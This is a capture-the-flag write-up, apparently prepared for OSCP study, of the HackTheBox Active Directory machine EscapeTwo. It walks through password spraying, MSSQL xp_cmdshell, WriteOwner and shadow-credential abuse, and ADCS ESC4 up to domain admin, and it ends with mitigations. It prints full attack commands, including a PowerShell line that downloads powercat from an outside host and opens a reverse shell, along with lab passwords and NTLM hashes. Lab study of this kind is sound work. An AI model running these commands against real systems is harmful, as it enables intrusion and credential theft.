---
title: EscapeTwo
date: 2025-06-05
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, AD, xlsx, password-spray, mssql, xp_cmdshell, WriteOwner, Shadow-credentials, certipy-ad,  ACL-Abuse, ESC4, ADCS ] 
image: escape2.png
media_subpath: /assets/img/posts/2025-06-05-escapetwoHTB/
---

## Introduction

**EscapeTwo** is an easy difficulty **Windows Active Directory** machine focused on chained misconfigurations leading to domain compromise. The scenario starts with provided credentials for a **low-privileged domain user**, which are used to access an **SMB share** containing **corrupted Excel files**. Analyzing these reveals passwords, which are **sprayed across the domain**, uncovering a user with **MSSQL access**. Using this, we extract SQL credentials and perform a second spray, gaining **WinRM access**. Further enumeration reveals **WriteOwner privileges** over a user tied to **ADCS (Active Directory Certificate Services)**. We identify a vulnerable **ESC1 template** misconfiguration and abuse it to request a certificate, retrieve the **Administrator NTLM hash**, and **fully compromise the domain**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 53

Version: Simple DNS Plus

Domain: **sequel.htb**

- **dig any DNS records**
    
    ```bash
    dig any **sequel.htb** @$IP
    ```
    
    ![image.png](image%202.png)
    
- **Zone Transfer**
    
    ```bash
    dig axfr @$IP **sequel.htb**
    ```
    
    ![image.png](image%203.png)
    

### Port 139/445

```bash
sudo nxc smb $IP -u support -p '#00^BlackKnight' -M spider_plus -o EXCLUDE_DIR=IPC$
```

```bash
sudo nxc smb $IP -u rose -p 'KxEPkKe6R8su' --shares
```

![image.png](image%204.png)

There were 2 `xlsx` files under `Account Department` share, I unzipped them and found some passwords inside.

```bash
Archive:  accounts.xlsx
file #1:  bad zipfile offset (local header sig):  0
  inflating: xl/workbook.xml         
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/sharedStrings.xml    
  inflating: _rels/.rels             
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
  inflating: docProps/custom.xml     
  inflating: [Content_Types].xml   
  
  Archive:  accounting_2024.xlsx
file #1:  bad zipfile offset (local header sig):  0
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/sharedStrings.xml    
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/printerSettings/printerSettings1.bin  
  inflating: docProps/core.xml       
  inflating: docProps/app.xml 
```

### Port 1433

As we obtained MSSQL password I am gonna try to connect to it.

```bash
mssqlclient.py -p 1433 sa@$IP
```

![image.png](image%205.png)

```sql
select * from master.dbo.sysdatabases;
```

Listing the databases I see just default ones:

![image.png](image%206.png)

I am gonna try to execute command:

```bash
enable_xp_cmdshell
xp_cmdshell whoami
```

![image.png](image%207.png)

Let’s get a reverse shell using powershell powercat.ps1.

Now I have a shell:

```bash
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.34/powercat.ps1');powercat -c 10.10.14.34 -p 443 -e cmd"
```

![image.png](image%208.png)

### Port 5985

```bash
sudo nxc winrm $IP -u rose -p 'KxEPkKe6R8su'
```

![image.png](image%209.png)

## AD Initial Enumeration

### User Enumeration

Unauthenticated

Authenticated

```bash
lookupsid.py sequel.htb/rose:'KxEPkKe6R8su'@sequel.htb | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee users
```

![image.png](image%2010.png)

### User Description Fields

```bash
sudo nxc smb $IP -u rose -p 'KxEPkKe6R8su' --users
```

![image.png](image%2011.png)

### Port 389/3268

```bash
ldapsearch -H ldap://$IP -x -s base -b '' "(objectClass=*)" "*" +
```

```powershell
ldapsearch -x -H ldap://$IP -D '' -w '' -b "DC=<sequel,DC=htb"
```

![image.png](image%2012.png)

LDAP Anonymous Bind is disabled.

<aside>
🚨

Search for Pwd, LegacyPwd

</aside>

## Initial Attack Vectors

### AS-REP Roasting

```bash
GetNPUsers.py sequel.htb/ -dc-ip $IP -no-pass -usersfile users
```

![image.png](image%2013.png)

### Password Spraying

```bash
sudo nxc smb $IP -u users -p passes --continue-on-success
```

Using users and obtained passwords in password spraying attack;

![image.png](image%2014.png)

Checking if oscar has winrm access:

```bash
sudo nxc winrm $IP -u oscar -p '86LxLBMgEWaKUnBG'
```

![image.png](image%2015.png)

## Post Compromise Enumeration

```bash
python3 /home/kali/.local/share/pipx/venvs/netexec/bin/bloodhound-python -d sequel.htb -u oscar -p 86LxLBMgEWaKUnBG -ns $IP -c all
```

![image.png](image%2016.png)

## Post Compromise Attacks

- **Kerberoasting**
    
    ```bash
    GetUserSPNs.py -dc-ip $IP sequel.htb/oscar
    ```
    
    ![image.png](image%2017.png)
    
    ```bash
    sudo ntpdate -u sequel.htb
    ```
    
    ```bash
    GetUserSPNs.py -dc-ip $IP sequel.htb/oscar -request
    ```
    
    Hashcat is exhausted cracking them.
    

## Shell as sql_svc

We have a shell as `sql_svc` but service account doesn’t have any high privileges neither have privileges over other objects. As `SQL2019` directory is non-default in root I will dig in it a bit.

I found a configuration file and found a password for `sql_svc` account, I checked this password for `ryan` user and found that it works for him too.

![image.png](image%2018.png)

```bash
sudo nxc smb $IP -u users -p WqSZAF6CysDQbGb3 --continue-on-success
```

![image.png](image%2019.png)

## Shell as ryan

```bash
sudo nxc winrm $IP -u ryan -p 'WqSZAF6CysDQbGb3’
```

![image.png](image%2020.png)

```bash
evil-winrm -i $IP -u ryan -p 'WqSZAF6CysDQbGb3’
```

We have `WriteOwner` privileges over `cs_svc` user:

![image.png](image%2021.png)

We will make us a new owner of the object then grant ourselves `FullControll` and then change its password.

```bash
impacket-owneredit -action write -new-owner 'ryan' -target-dn 'CN=CERTIFICATION AUTHORITY,CN=USERS,DC=SEQUEL,DC=HTB' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip $IP
```

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target-dn 'CN=CERTIFICATION AUTHORITY,CN=USERS,DC=SEQUEL,DC=HTB' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip $IP
```

Change password:

```bash
net rpc password ca_svc 'Password1234' -U sequel.htb/ryan%'WqSZAF6CysDQbGb3' -S $IP
```

![image.png](image%2022.png)

## Owned ca_svc

ca_svc service account is a member of `Cert Publishers` domain group. Group is the "Cert Publishers" built-in group whose members usually are the servers where AD CS is installed (i.e. PKI/CA).

Running certipy I see that target os vulnerable to `ESC4` vulnerability:

```bash
certipy-ad find -u 'ca_svc@sequel.htb' -p 'Password1234' -dc-ip $IP  -vulnerable -stdout
```

![image.png](image%2023.png)

[adcs-esc4-vulnerable-certificate-template-access-control](https://www.hackingarticles.in/adcs-esc4-vulnerable-certificate-template-access-control/)

```bash
certipy-ad template -u ca_svc -p Password1234 -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -target dc01.sequel.htb -save-old
```

I was trying to perform this attack with password but kept failing, I understood that in case of `writeowner` permission better to obtained object’s hash which is set already in original setup, without changing anything, that’s why I used `Shadow Credentials` attack to obtained `NTLM` hash of `ca_svc` user.

```bash
certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.10.11.51
```

![image.png](image%2024.png)

```bash
certipy-ad find -vulnerable -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -stdout
```

![image.png](image%2025.png)

```bash
certipy-ad template -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -target dc01.sequel.htb -save-old
```

![image.png](image%2026.png)

```bash
certipy-ad req -ca sequel-DC01-CA -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb
```

![image.png](image%2027.png)

```bash
certipy-ad auth -pfx administrator.pfx
```

![image.png](image%2028.png)

```bash
evil-winrm -i $IP -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

![image.png](image%2029.png)

## Credentials

```bash
rose : KxEPkKe6R8su
oscar : 86LxLBMgEWaKUnBG
sa : MSSQLP@ssw0rd!
sql_svc : WqSZAF6CysDQbGb3
ryan : WqSZAF6CysDQbGb3
ca_svc : Password1234
```

## Mitigation

- **Limit SMB share exposure** and enforce strict access controls on sensitive internal documents.
- Implement **Account Lockout Policies** to defend against **password spraying attacks**.
- Audit **MSSQL configuration**, avoid overprivileged accounts, and restrict linked credentials in databases.
- Monitor for and restrict **WinRM usage**, especially across low-privileged users.
- Review **Active Directory ACLs** for excessive privileges like `WriteOwner`, which can lead to privilege escalation.
- Regularly audit and harden **ADCS templates**; disable vulnerable ones or apply the [ESC1](https://github.com/GhostPack/Certify/wiki/Active-Directory-Certificate-Services-Attack-Chain-Overview#ESC1) and ESC4 fix recommendations from Microsoft.
- Enforce **least privilege** across user accounts and certificate enrollment permissions.
